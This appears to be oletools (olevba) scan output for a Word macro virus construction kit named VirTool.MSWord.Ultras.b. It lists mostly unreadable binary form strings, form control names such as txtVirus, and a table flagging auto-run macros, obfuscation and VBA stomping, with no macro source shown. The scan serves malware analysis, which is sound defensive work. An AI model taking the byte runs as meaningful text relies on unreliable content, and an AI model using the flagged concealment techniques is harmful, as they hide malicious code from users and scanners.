- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
			������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c  {������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wpp�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������		

-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XPP����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
``t������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������fffDDDQQR���������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Small Fonts
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image2'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image3'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image4'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Text'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtVirus'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Name'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UMAIN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Image1'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton5_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|DVVt                |44565674                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

